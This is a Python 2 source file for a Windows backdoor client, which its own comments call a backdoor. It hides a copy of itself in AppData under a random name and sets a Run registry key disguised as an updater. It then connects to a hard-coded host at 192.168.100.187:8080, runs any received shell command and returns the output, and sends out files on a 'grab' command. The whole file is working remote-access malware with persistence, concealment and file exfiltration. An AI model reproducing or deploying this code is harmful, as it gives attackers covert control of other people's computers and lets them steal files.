# Client

import socket # for building TCP conneciton
import subprocess # to start the shell in the system
import os # needed for file operations
import ctypes # to edit file attributes (make file hidden)
import shutil # needed for file copying
from _winreg import * # needed for editing registry

import time
import random
import string


FILE_ATTRIBUTE_HIDDEN = 0x02


# function to create a random string
def randomword(length):
    return ''.join(random.choice(string.lowercase) for i in range(length))


# function to verify if our registry is already there
def keyIsNotInReg():

    try:
        root_key = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run\\', 0, KEY_READ)
        [Pathname,regtype] = (QueryValueEx(root_key,"RegTCPClientUpdater"))
        CloseKey(root_key)
        if (""==Pathname):
            return True
        else:
            # everything is okay
            return False

    except WindowsError,e:
        # could not read, find key ...
        return True
    

# reconn phase

# get current working directory where the backdoor gets executed
# we use the output to build our source path
# could be sth like:
# C:\Windows\System32 or C:\Users\XY\Desktop\XY
path = os.getcwd().strip('/n')

# get user profile which contains the username, store in userprof var
# C:\Windows\System32>set USERPROFILE
# USERPROFILE=C:\Users\Max
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# create random dest filename
random_string = randomword(6)
random_filename = random_string + '.exe'

# build dest path where we copy our backdor - we choose C:\Users\XY\Documents\
# destination = userprof.strip('\n\r') + '\\Documents\\' + random_filename
destination = userprof.strip('\n\r') + '\\AppData\\Local\\' + random_filename


# reconn phase 1 & 2

# verify if our script was run before and our backdoor was started via registry - if yes, no need to keep current backdoor
if keyIsNotInReg():
    
    # verify if our script was run before and our backdoor was copied to our destination
    if not os.path.exists(destination):

        # first time our backdoor gets executed
        # copy our backdoor to our destination - C:\Users\XY\Documents\
        shutil.copyfile(path + '\\tcp_client.exe', destination)

        # make file hidden
        if os.name == 'nt':
            # unicode string is needed
            ret = ctypes.windll.kernel32.SetFileAttributesW(unicode(destination, 'utf-8'), FILE_ATTRIBUTE_HIDDEN)

        # create registry key called Regupdater pointing to our  new backdoor path (destination)
        # we use HKEY_CURRENT_USER path, so we do not need admin priv
        key = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(key, 'RegTCPClientUpdater', 0, REG_SZ, destination)
        key.Close()


    
def transfer(s, path):
    if os.path.exists(path): # verify if request file exists
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else: # file does not exist
        s.send('Unable to find out the file')


def connect():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.100.187', 8080))

        while True: # keep receiving data
            command = s.recv(1024)

            if 'terminate' in command:
                s.close() # close the socket
                break

            # grab command - start file transfer
            # grab formula: grab*<file path>
            # grab example: grab*C:\Users\XY\Desktop\Photo.jpg
            elif 'grab' in command:
                grab, path = command.split('*')

                try:
                    transfer(s, path)
                except Exception, e:
                    s.send(str(e)) # send exception error
                    pass

            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read() ) # send the result
                s.send( CMD.stderr.read() ) # incase of error, we will send back the error



def main():
    # infinite loop in that we try to connect to our host machine. if we got an exception (connection error),
    # then we sleep for a randowm time, pass the exception and try to establish a new connectoin
    while True:

        try:
            if connect() == 1:
                break # end infinite loop and so the script

        except:
            sleep_for = random.randrange(1, 10)
            time.sleep(sleep_for) # sleep for a randowm time between 1-10 sec
            # time.sleep(sleep_for * 60) # sleep for a randowm time between 1-10 minutes
            pass


main()
